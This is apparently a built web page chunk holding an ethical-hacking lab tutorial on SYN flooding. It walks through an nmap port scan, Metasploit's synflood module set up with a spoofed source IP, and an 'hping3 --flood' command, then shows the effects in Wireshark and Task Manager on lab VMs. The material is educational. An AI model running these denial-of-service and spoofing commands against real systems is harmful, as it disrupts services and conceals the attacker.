import{_ as a,c as n,a1 as s,o as t}from"./chunks/framework.BDxlaA_J.js";const g=JSON.parse('{"title":"SYN Flooding","description":"","frontmatter":{},"headers":[],"relativePath":"categories/ethical-hacking-labs/9-denial-of-service/1-SYN-Flooding.md","filePath":"categories/ethical-hacking-labs/9-denial-of-service/1-SYN-Flooding.md"}'),o={name:"categories/ethical-hacking-labs/9-denial-of-service/1-SYN-Flooding.md"};function i(r,e,p,c,l,d){return t(),n("div",null,e[0]||(e[0]=[s(`<h1 id="syn-flooding" tabindex="-1">SYN Flooding <a class="header-anchor" href="#syn-flooding" aria-label="Permalink to &quot;SYN Flooding&quot;">​</a></h1><p>A SYN flood is a form of denial-of-service attack in which an attacker sends a succession of SYN requests to a target machine in an attempt to exhaust its resources and make it unresponsive to legitimate incoming traffic.</p><p align="center"><img width="70%" src="https://www.researchgate.net/profile/Pratick_Bakhtiani/publication/304092271/figure/fig4/AS:374545031680000@1466309902047/TCP-SYN-flooding-attack-8.png"></p><p>A TCP session establishes a connection using a three-way handshake mechanism. The source sends a SYN packet to the destination. The destination, on receiving the SYN packet, responds by sending a SYN/ACK packet back to the source. This SYN/ACK packet confirms the arrival of the first SYN packet to the source. In conclusion, the source sends an ACK packet for the ACK/SYN packet sent by the destination. In a SYN attack, the attacker exploits the three-way handshake method. First, the attacker sends a fake TCP SYN request to the target server, and when the server sends a SYN/ACK in response to the client (attacker) request, the client never sends an ACK response. This leaves the server waiting to complete the connection.</p><p align="center"><img width="70%" src="https://www.cloudflare.com/img/learning/ddos/syn-flood-ddos-attack/syn-flood-attack-ddos-attack-diagram-1.png"></p><hr><h3 id="objectives" tabindex="-1">Objectives <a class="header-anchor" href="#objectives" aria-label="Permalink to &quot;Objectives&quot;">​</a></h3><ul><li>Spoof IP address of the attacker machine</li><li>Perform SYN Flooding on the Target machine</li></ul><h3 id="requisites" tabindex="-1">Requisites <a class="header-anchor" href="#requisites" aria-label="Permalink to &quot;Requisites&quot;">​</a></h3><ul><li>Kali Linux virtual machine</li><li>Windows 10 virtual machine (w/ Firewall off)</li><li>Windows Server 2012 or 2016 virtual machine</li></ul><h2 id="test-for-open-port" tabindex="-1">Test for Open Port <a class="header-anchor" href="#test-for-open-port" aria-label="Permalink to &quot;Test for Open Port&quot;">​</a></h2><p>Log into the Kali Linux and open a new terminal window.</p><p>We are going to perform SYN flooding on Windows 10 through some <strong>open port</strong>. To check what port is open or not, we will use Nmap to scan all open ports.</p><p><code>nmap -p- &lt;Windows 10 IP address&gt;</code></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>PORT      STATE SERVICE</span></span>
<span class="line"><span>135/tcp   open  msrpc</span></span>
<span class="line"><span>139/tcp   open  netbios-ssn</span></span>
<span class="line"><span>445/tcp   open  microsoft-ds</span></span>
<span class="line"><span>5040/tcp  open  unknown</span></span>
<span class="line"><span>7680/tcp  open  pando-pub</span></span>
<span class="line"><span>49664/tcp open  unknown</span></span>
<span class="line"><span>49665/tcp open  unknown</span></span>
<span class="line"><span>49666/tcp open  unknown</span></span>
<span class="line"><span>49668/tcp open  unknown</span></span>
<span class="line"><span>49669/tcp open  unknown</span></span>
<span class="line"><span>49670/tcp open  unknown</span></span>
<span class="line"><span>49671/tcp open  unknown</span></span></code></pre></div><p>In this lab, we will use an auxiliary module from <strong>Metasploit</strong> named <strong>synflood</strong> to perform DoS attack on the target using port 445.</p><h2 id="perform-dos-attack" tabindex="-1">Perform DoS attack <a class="header-anchor" href="#perform-dos-attack" aria-label="Permalink to &quot;Perform DoS attack&quot;">​</a></h2><p>Type <strong>msfconsole</strong> to launch Metasploit Framework.</p><p><code>msfconsole</code></p><p>Type the command to load the module:</p><p><code>use auxiliary/dos/tcp/synflood</code></p><p>To display all the options of the module, type:</p><p><code>options</code></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>Name       Current Setting  Required  Description</span></span>
<span class="line"><span>----       ---------------  --------  -----------</span></span>
<span class="line"><span>INTERFACE                   no        The name of the interface</span></span>
<span class="line"><span>NUM                         no        Number of SYNs to send (else unlimited)</span></span>
<span class="line"><span>RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;</span></span>
<span class="line"><span>RPORT      80               yes       The target port</span></span>
<span class="line"><span>SHOST                       no        The spoofable source address (else randomizes)</span></span>
<span class="line"><span>SNAPLEN    65535            yes       The number of bytes to capture</span></span>
<span class="line"><span>SPORT                       no        The source port (else randomizes)</span></span>
<span class="line"><span>TIMEOUT    500              yes       The number of seconds to wait for new data</span></span></code></pre></div><p>We will change the RHOST, RPORT and SHOST parameters:</p><p><code>set RHOST [IP address of Windows 10]</code><code>set RPORT 445</code><code>set SHOST [IP address of Windows Server]</code></p><p>By setting the <strong>SHOST</strong> option to the IP address of Windows Server, you are spoofing the IP address of Kali Linux machine.</p><p>Once the auxiliary module is configured, start the DoS attack on Windows 10 by typing:</p><p><code>run</code></p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/9f36f0e0d55c0b7429e547dd93c7c55c55b96ea4/synflood-0.png" alt="synflood"></p><p>This begins the SYN flooding on the Windows 10.</p><h2 id="examine-the-dos-attack" tabindex="-1">Examine the DoS Attack <a class="header-anchor" href="#examine-the-dos-attack" aria-label="Permalink to &quot;Examine the DoS Attack&quot;">​</a></h2><p>Switch to the Windows 10 machine and launch the <a href="https://www.wireshark.org/" target="_blank" rel="noreferrer"><strong>Wireshark</strong></a>, select the corret interface and click start.</p><p>Wireshark displays the traffic comming from the machine as shown below:</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/9f36f0e0d55c0b7429e547dd93c7c55c55b96ea4/synflood-wireshark-4.png" alt="wireshark-synflood-detect"></p><p>Here, you can observe that the source IP address is from Windows Server. This implies that the IP Address of Kali Linux has been spoofed.</p><p>Next, open the <strong>Task Manager</strong> on Windows 10 and click <strong>performance</strong> tab.</p><p>You will observe that the CPU and Ethernet usage has increased drastically after the attack, which implies that the DoS attack is in progress. If the attack is continued for some time, the machine&#39;s resources would be completely exhausted, and it will stop responding.</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/50372a5d43eb96f78aa8886cb7b3eef9b1d417eb/synflood-task-manager-2.png" alt="task-manager"></p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/9f36f0e0d55c0b7429e547dd93c7c55c55b96ea4/synflood-task-manager-1.png" alt="task-manager-2"></p><p>To stop the DoS attack, back to Metasploit on Kali and press <strong>Ctrl+C</strong> to terminate attack.</p><h1 id="syn-flooding-using-hping3" tabindex="-1">SYN Flooding using hping3 <a class="header-anchor" href="#syn-flooding-using-hping3" aria-label="Permalink to &quot;SYN Flooding using hping3&quot;">​</a></h1><p>hping3 is a command-line oriented TCP/IP packet assembler/analyzer.</p><p>To learn more about <strong>hping3</strong> you can check <a href="https://github.com/Samsar4/Ethical-Hacking-Labs/blob/master/2-Scanning-Networks/1-hping3.md" target="_blank" rel="noreferrer">this module</a>.</p><h2 id="perform-syn-flooding-using-hping3" tabindex="-1">Perform SYN flooding using hping3 <a class="header-anchor" href="#perform-syn-flooding-using-hping3" aria-label="Permalink to &quot;Perform SYN flooding using hping3&quot;">​</a></h2><p><code>hping3 -S [Windows 10 IP address] -a [Kali IP address] -p 22 --flood</code></p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/72394c4deaa152f806930cd26a1e4cf424b3e77a/syn-2.png" alt="syn2"></p><p>This initiates the SYN flooding on Windows 10.</p><p>Hping3 floods the victim machine by sending bulk <strong>SYN bulks</strong> and <strong>overloading</strong> victim resources.</p><p>Switch to the Windows 10 and launch the <a href="https://www.wireshark.org/" target="_blank" rel="noreferrer">Wireshark</a>, select the correct interface and start capturing.</p><p>Analyze the traffic captured, you will notice the huge number of <strong>SYN packets</strong>, which can cause the target machine to crash.</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/72394c4deaa152f806930cd26a1e4cf424b3e77a/syn-wireshark-2.png" alt="wireshark2"></p>`,52)]))}const u=a(o,[["render",i]]);export{g as __pageData,u as default};
